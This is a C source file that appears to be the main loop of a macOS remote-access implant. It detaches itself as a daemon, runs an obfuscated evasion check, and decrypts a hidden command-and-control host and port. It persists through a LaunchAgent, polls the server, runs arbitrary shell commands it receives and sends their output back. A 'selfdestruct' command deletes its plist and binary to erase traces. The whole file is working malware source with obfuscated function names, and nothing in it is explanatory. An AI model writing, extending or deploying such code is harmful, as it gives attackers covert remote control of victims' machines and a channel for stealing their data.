#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <mach-o/dyld.h>
#include <sys/stat.h>

#include "config.h"
#include "evasion.h"
#include "shell.h"
#include "persist.h"
#include "beacon.h"

static void pxqrvmbt(char *out, size_t len) {
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname));
    snprintf(out, len, "%s-%d", hostname, (int)getpid());
}

static char *qnvtxmrb(void) {
    static char path[1024];
    uint32_t size = sizeof(path);
    _NSGetExecutablePath(path, &size);
    return path;
}

static void daemonize(void) {
    if (getenv("_AGENT_DAEMON")) return;

    pid_t pid = fork();
    if (pid < 0)  _exit(1);
    if (pid > 0)  _exit(0);

    setsid();

    setenv("_AGENT_DAEMON", "1", 1);

    int fd = open("/dev/null", O_RDWR);
    if (fd >= 0) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        if (fd > 2) close(fd);
    }
}

int main(void) {
    daemonize();

    if (mxntpqvb()) return 0;

    xkqprtmn();

    DECL_STR(c2_host,   _c2_host_enc);
    DECL_STR(c2_port_s, _c2_port_enc);
    DECL_STR(label,     _c2_label_enc);
    int c2_port = atoi(c2_port_s);

    bqxrtmnp(label, qnvtxmrb());

    char agent_id[512];
    pxqrvmbt(agent_id, sizeof(agent_id));

    while (1) {
        BXQVTNMR cmd = {0};
        int r = nqvxbrtm(c2_host, c2_port, agent_id, &cmd);

        if (r == 1) {
            char *output = NULL;

            if (strcmp(cmd.cmd, "shell") == 0) {
                output = dkqwvzmn(cmd.arg);
            } else if (strcmp(cmd.cmd, "selfdestruct") == 0) {
                char rm_cmd[512];
                DECL_STR(lbl, _c2_label_enc);
                snprintf(rm_cmd, sizeof(rm_cmd),
                    "launchctl unload ~/Library/LaunchAgents/%s.plist "
                    "&& rm -f ~/Library/LaunchAgents/%s.plist "
                    "&& rm -f '%s'",
                    lbl, lbl, qnvtxmrb());
                dkqwvzmn(rm_cmd);
                return 0;
            } else if (strcmp(cmd.cmd, "pwd") == 0) {
                char cwd[512];
                getcwd(cwd, sizeof(cwd));
                output = strdup(cwd);
            } else if (strcmp(cmd.cmd, "cd") == 0) {
                chdir(cmd.arg);
                output = strdup("ok");
            }

            if (output) {
                kxvqtnbr(c2_host, c2_port, agent_id, output);
                free(output);
            }
        }

        bvzlwqrt();
    }
    return 0;
}
